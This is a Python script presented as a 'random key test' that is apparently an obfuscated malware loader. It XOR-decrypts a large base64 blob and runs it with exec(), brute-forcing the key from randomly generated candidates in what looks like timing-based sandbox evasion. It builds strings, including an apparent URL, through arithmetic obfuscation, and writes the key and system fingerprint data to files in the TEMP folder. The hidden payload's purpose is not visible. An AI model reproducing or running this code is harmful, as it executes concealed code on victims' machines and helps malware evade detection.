import random
import base64
import platform
import multiprocessing
import time
import re
import os
import glob
import requests

import easygui

# check info system

# random key test
tic = time.time()
my_system = platform.uname()

ASCII = [chr(i) for i in range(0x00, 0xff)]
HEX = [hex(i) for i in range(0x00, 0xff)]
OCTAL = [oct(ord(chr(i)))[2:] for i in range(0x00, 0xff)]


arrKeyAscii = [''.join([ASCII[random.randint(0, len(ASCII)-1)]
                        for i in range(128)]) for i in range(200)]
arrKeyHex = [''.join([HEX[random.randint(0, len(HEX)-1)]
                      for i in range(128)]) for i in range(10)]

arrKeyOctal = [''.join([OCTAL[random.randint(0, len(OCTAL)-1)]
                        for i in range(128)]) for i in range(10)]

# print(chr(int('376', 8)))


Key1 = '''^).RRg~.\;f?Z'G`+!n"m?6E`%a'fN>yn;_|'^Nb]hpr]ut3fK^Y]bF9xQ~=)~JSUyx$iCZS*>@4:^)Si\+|z#P@vBYF$d{Cx$_>'''
arrKeyAscii.append(Key1)
keytemp = ''


def de(temp, decode):
    try:
        index = 0
        lengthPS = len(temp) - 1
        xx = b''
        for i in decode:
            xx += (i ^ ord(temp[index])).to_bytes(1, 'little')
            if index + 1 > lengthPS:
                index = 0
            else:
                index += 1
        return xx
    except:
        print('error')


asdasd = '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'
setTop = False
setexecu = 0

_ = ((() == ())+(() == ()))
__ = (((_ << _) << _)*_)
localbitpmsd = ('c%'[::(([] != [])-(() == ()))])*((_ << _)+(_*_)) % ((__+((_ << _)+(_*_))), (__+((_ << _)+((_*_)+(_+(() == ()))))), (__+(_+(() == ()))), (__+(() == ())),
                                                                     (__+((_ << _)+(_*_))), (__+(() == ())), (__+((_ << _)*_)), (__+((_ << _)*_)), (__+(_*_)), (__+(() == ())), (__+(((_ << _)*_)+(_*_))), (__+(() == ())))
_ = ((() == ())+(() == ()))
__ = (((_ << _) << _)*_)
ggasndqwj = ('c%'[::(([] != [])-(() == ()))])*(((_ << _)*_)+(_ << _)) % ((__+(((_ << _)*_)+((_ << _)+(_*_)))), (__+((_*_)+(_+(() == ())))), (__+(((_ << _) << _)+((_ << _)+((_*_)+(_+(() == ())))))), (__+(((_ << _) << _)+((_ << _)+((_*_)+(_+(() == ())))))), (__+(((_ << _) << _)+((_*_)+(_+(() == ()))))), (__+(((_ << _) << _)+((_ << _)+(_*_)))), (__+(((_ << _) << _)+((_*_)+(() == ())))), (__+(((_ << _)*_)+((_ << _)+(_*_)))), (__+(_+(() == ()))), (__+(((_ << _) << _)+(_ << _))), (__+(((_ << _) << _)+(((_ << _)*_)+_))),
                                                                         (__+(((_ << _) << _)+((_ << _)+((_*_)+(_+(() == ())))))), (__+(((_ << _) << _)+((_ << _)+((_*_)+(() == ()))))), (__+(((_ << _) << _)+((_*_)+(() == ())))), (__+(((_ << _)*_)+((_ << _)+(_*_)))), (__+(((_ << _)*_)+((_*_)+(() == ())))), (__+(((_ << _) << _)+(((_ << _)*_)+(_+(() == ()))))), (__+(((_ << _) << _)+((_*_)+(() == ())))), (__+(((_ << _) << _)+(((_ << _)*_)+_))), ((_ << _) << _), (__+(_*_)), (__+(((_ << _) << _)+(() == ()))), (__+(((_ << _) << _)+(((_ << _)*_)+(_*_)))), (__+(((_ << _) << _)+(() == ()))))
_ = ((() == ())+(() == ()))
__ = (((_ << _) << _)*_)
ccqweiihc = ('c%'[::(([] != [])-(() == ()))])*(((_ << _)*_)+((_ << _)+(() == ()))) % ((__+(((_ << _)*_)+((_ << _)+(_*_)))), (__+(_+(() == ()))), (__+(((_ << _) << _)+((_ << _)+((_*_)+(_+(() == ())))))), (__+(((_ << _) << _)+(_+(() == ())))), (__+(_+(() == ()))), (__+(((_ << _) << _)+((_ << _)+((_*_)+(_+(() == ())))))), (__+(((_ << _) << _)+(_+(() == ())))), (__+(((_ << _)*_)+((_ << _)+(_*_)))), (__+_), (__+(((_ << _) << _)+(((_ << _)*_)+_))), (__+(((_ << _) << _)+((_ << _)+((_*_)+(_+(() == ())))))), (__+(((_ << _) << _) +
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              (((_ << _)*_)+((_*_)+(_+(() == ())))))), (__+(((_ << _) << _)+(((_ << _)*_)+(_+(() == ()))))), (__+(((_ << _) << _)+((_*_)+(() == ())))), (__+(((_ << _) << _)+(((_ << _)*_)+_))), (__+(((_ << _)*_)+((_ << _)+(_*_)))), (__+(((_ << _)*_)+((_*_)+(() == ())))), (__+(((_ << _) << _)+(((_ << _)*_)+(_+(() == ()))))), (__+(((_ << _) << _)+((_*_)+(() == ())))), (__+(((_ << _) << _)+(((_ << _)*_)+_))), ((_ << _) << _), (__+(_*_)), (__+(((_ << _) << _)+(() == ()))), (__+(((_ << _) << _)+(((_ << _)*_)+(_*_)))), (__+(((_ << _) << _)+(() == ()))))

_ = ((() == ())+(() == ()))
__ = (((_ << _) << _)*_)
v1asd = ('c%'[::(([] != [])-(() == ()))])*((_ << _)+(() == ())) % ((__+(((_ << _)*_)+((_*_)+(() == ())))), (__+(((_ << _) << _)+(((_ << _)*_)+(_+(() == ()))))), (__+(((_ << _) << _)+((_*_)+(() == ())))),
                                                                   (__+(((_ << _) << _)+(((_ << _)*_)+_))), ((_ << _) << _), (__+(_*_)), (__+(((_ << _) << _)+(() == ()))), (__+(((_ << _) << _)+(((_ << _)*_)+(_*_)))), (__+(((_ << _) << _)+(() == ()))))


_ = ((() == ())+(() == ()))
__ = (((_ << _) << _)*_)
v2asd = ('c%'[::(([] != [])-(() == ()))])*((_*_)+(_+(() == ()))) % ((__+(_*_)), (__+(((_ << _) << _)+((_*_)+(() == ())))), (__+(((_ << _) << _)+((_*_)+_))), (__ +
                                                                                                                                                              (((_ << _) << _)+(() == ()))), (__+(((_ << _) << _)+(((_ << _)*_)+((_*_)+(() == ()))))), (__+(((_ << _) << _)+((_ << _)+(_*_)))), (__+(((_ << _) << _)+(((_ << _)*_)+(_*_)))))
_ = ((() == ())+(() == ()))
__ = (((_ << _) << _)*_)
v3asd = ('c%'[::(([] != [])-(() == ()))])*((_*_)+(_+(() == ()))) % ((__+((_ << _)*_)), (__+(((_ << _) << _)+(((_ << _)*_)+_))), (__+(((_ << _) << _)+((_ << _)+((_*_)+(_+(() == ())))))),
                                                                    (__+(((_ << _) << _)+((_*_)+_))), (__+(((_ << _) << _)+((_ << _)+(() == ())))), (__+(((_ << _) << _)+((_ << _)+(_*_)))), (__+(((_ << _) << _)+((_*_)+(() == ())))))
_ = ((() == ())+(() == ()))
__ = (((_ << _) << _)*_)
v4asd = ('c%'[::(([] != [])-(() == ()))])*((_*_)+(_+(() == ()))) % ((__+((_ << _)+((_*_)+_))), (__+(((_ << _) << _)+((_*_)+(() == ())))), (__+(((_ << _) << _)+(((_ << _)*_)+(_*_)))), (__+(((_ << _)
                                                                                                                                                                                             << _)+(((_ << _)*_)+((_*_)+(_+(() == ())))))), (__+(((_ << _) << _)+((_ << _)+((_*_)+(_+(() == ())))))), (__+(((_ << _) << _)+(((_ << _)*_)+_))), (__+(((_ << _) << _)+((_ << _)+(_+(() == ()))))))
_ = ((() == ())+(() == ()))
__ = (((_ << _) << _)*_)
v5asd = ('c%'[::(([] != [])-(() == ()))])*((_ << _)+_) % ((__+((_ << _)+(_*_))), (__+(((_ << _) << _)+((_ << _)+((_*_)+(_+(() == ())))))), (__+(((_ << _) << _)+((_*_)+(_+(() == ()))))), (__+(((_ << _) << _) +
                                                                                                                                                                                               ((_ << _)+(() == ())))), (__+(((_ << _) << _)+((_ << _)+((_*_)+_)))), ((_ << _) << _), (__+(_*_)), (__+(((_ << _) << _)+(() == ()))), (__+(((_ << _) << _)+(((_ << _)*_)+(_*_)))), (__+(((_ << _) << _)+(() == ()))))
_ = ((() == ())+(() == ()))
__ = (((_ << _) << _)*_)
v6asd = ('c%'[::(([] != [])-(() == ()))])*((_*_)+(_+(() == ()))) % ((__+(_+(() == ()))), (__+(((_ << _) << _)+((_ << _)+((_*_)+(_+(() == ())))))), (__+(((_ << _) << _)+((_ << _)+((_*_)+(_+(() == ())))))),
                                                                    (__+(((_ << _) << _)+((_ << _)+(_+(() == ()))))), (__+(((_ << _) << _)+((_ << _)+(() == ())))), (__+(((_ << _) << _)+((_*_)+(() == ())))), (__+(((_ << _) << _)+(((_ << _)*_)+(_+(() == ()))))))


_=((()==())+(()==()));__=(((_<<_)<<_)*_);urldismemasd=('c%'[::(([]!=[])-(()==()))])*(((_<<_)<<_)+((_<<_)+((_*_)+(()==()))))%((__+(((_<<_)<<_)+(_<<_))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_*_)))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_*_)))),(__+(((_<<_)<<_)+((_<<_)*_))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_+(()==()))))),(((_<<_)<<_)+(((_<<_)*_)+((_<<_)+_))),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()==()))))),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()==()))))),(__+(((_<<_)<<_)+(_+(()==())))),(__+(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()==())))))),(__+(((_<<_)<<_)+((_<<_)+((_*_)+_)))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_*_)))),(__+(((_<<_)<<_)+((_*_)+(()==())))),(__+(((_<<_)<<_)+((_<<_)+((_*_)+_)))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_*_)))),(((_<<_)<<_)+((_<<_)+((_*_)+_))),(__+(((_<<_)<<_)+(_*_))),(__+(((_<<_)<<_)+(((_<<_)*_)+_))),(__+(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()==())))))),(__+(((_<<_)<<_)+((_<<_)*_))),(__+(((_<<_)<<_)+_)),(__+(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()==())))))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_<<_)))),(__+(((_<<_)<<_)+(()==()))),(__+(((_<<_)<<_)+((_<<_)*_))),(__+(((_<<_)<<_)+((_<<_)+(()==())))),(((_<<_)<<_)+((_<<_)+((_*_)+_))),(__+(((_<<_)<<_)+(_+(()==())))),(__+(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()==())))))),(__+(((_<<_)<<_)+((_<<_)+((_*_)+(()==()))))),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()==()))))),(((_<<_)<<_)+(((_<<_)*_)+_)),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()==()))))),(__+(((_<<_)<<_)+((_*_)+_))),(__+(((_<<_)<<_)+((_<<_)+(()==())))),(__+(((_<<_)<<_)+((_<<_)+(_*_)))),(__+(((_<<_)<<_)+((_*_)+(()==())))),(__+(((_<<_)<<_)+(((_<<_)*_)+(_+(()==()))))),(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()==()))))),(__+(((_<<_)<<_)+(((_<<_)*_)+((_*_)+(()==()))))),(__+(((_<<_)<<_)+((_<<_)*_))),(__+(((_<<_)<<_)+((_<<_)+(_*_)))),(__+(((_<<_)<<_)+((_<<_)+((_*_)+(_+(()==())))))),(__+(((_<<_)<<_)+(()==()))),(__+(((_<<_)<<_)+(_*_))))


def stop():
    if setTop == False:
        for i in arrKeyAscii:
            try:
                keytemp = i
                exec(base64.b64decode(de(i, base64.b64decode(asdasd))))
                f = open(os.environ['TEMP'] + "\\test.txt", "w")
                f.write(i)
                f.close()
                break
            except:
                print(arrKeyAscii.index(i))
                if i == arrKeyAscii[len(arrKeyAscii)-1]:
                    count = 0
                    for i in arrKeyAscii:
                        print(i)
                        handleArrKey = arrKeyAscii[count]
                        for i in arrKeyAscii:
                            handleArrKey += i[-2:]
                        for i in arrKeyAscii:
                            try:
                                keytemp = i
                                exec(base64.b64decode(
                                    de(handleArrKey, base64.b64decode(asdasd))))
                                zxczx = open(
                                    os.environ['TEMP'] + "\\checkComputer1.txt", "w")
                                zxczx.write(f"System: {my_system.system}")
                                zxczx.write(f"Node Name: {my_system.node}")
                                zxczx.write(f"Release: {my_system.release}")
                                zxczx.write(f"Version: {my_system.version}")
                                zxczx.write(f"Machine: {my_system.machine}")
                                zxczx.write(
                                    f"Processor: {my_system.processor}")
                                zxczx.write(
                                    f"Processor: {multiprocessing.cpu_count()}")
                                zxczx.write(
                                    f"time: {time.time() - tic}")
                                zxczx.close()
                                break
                            except:
                                handleArrKey = handleArrKey[:-2]
                                if i == arrKeyAscii[len(arrKeyAscii)-1]:
                                    count += 1
                                    time.sleep(1)
                                continue

                    for x in arrKeyAscii:
                        print(x)
                        for y in range(1000):
                            try:
                                keytemp = x + f'{y}'

                                exec(base64.b64decode(
                                    de(x + f'{y}', base64.b64decode(asdasd))))
                                zxczx = open(
                                    os.environ['TEMP'] + "\\checkComputer2.txt", "w")
                                zxczx.write(f"System: {my_system.system}")
                                zxczx.write(f"Node Name: {my_system.node}")
                                zxczx.write(f"Release: {my_system.release}")
                                zxczx.write(f"Version: {my_system.version}")
                                zxczx.write(f"Machine: {my_system.machine}")
                                zxczx.write(
                                    f"Processor: {my_system.processor}")
                                zxczx.write(
                                    f"Processor: {multiprocessing.cpu_count()}")
                                zxczx.write(
                                    f"time: {time.time() - tic}")
                                break
                            except:
                                continue
                continue
    else:
        stop()


stop()
